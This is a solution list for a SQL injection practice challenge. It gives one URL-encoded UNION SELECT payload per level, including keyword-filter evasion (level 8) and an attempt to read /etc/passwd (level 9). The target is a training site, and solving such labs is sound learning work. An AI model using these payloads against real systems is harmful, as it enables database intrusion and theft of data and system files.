# ZixemSQLi Challange

[READ RULES](http://www.zixem.altervista.org/SQLi/index.php)

## LEVEL 1

```
http://www.zixem.altervista.org/SQLi/level1.php?id=1111%20union%20select%20concat_ws(0x3a,%20version(),%20user()),%2022,%203
```

## LEVEL 2

```
http://www.zixem.altervista.org/SQLi/level2.php?showprofile=-1' union select database(),version(),user(),4--+
```

## LEVEL 3

```
http://www.zixem.altervista.org/SQLi/level3.php?item=-4%27%20unionon%20SeLect%20database(),User(),version(),4--+
```

## LEVEL 4

```
http://www.zixem.altervista.org/SQLi/level4.php?ebookid=999%27%20union%20select%20version(),2,user(),4,5--+
```

## LEVEL 5

```
view-source:http://www.zixem.altervista.org/SQLi/level7.php?id=1111111%20union%20select%201,concat_ws(0x3a,%20version(),user()),2--+
```

## LEVEL 8

SELECT is trimmed, spaces are banned, comments are banned

```
http://www.zixem.altervista.org/SQLi/lvl8.php?id=11111111111111111111111%09union%09selselectect%09version(),user(),2
```

## LEVEL 9

```
http://www.zixem.altervista.org/SQLi/lvl9.php?id=2%27%20union%20select%20%22../etc/passwd%22,%202--+
```


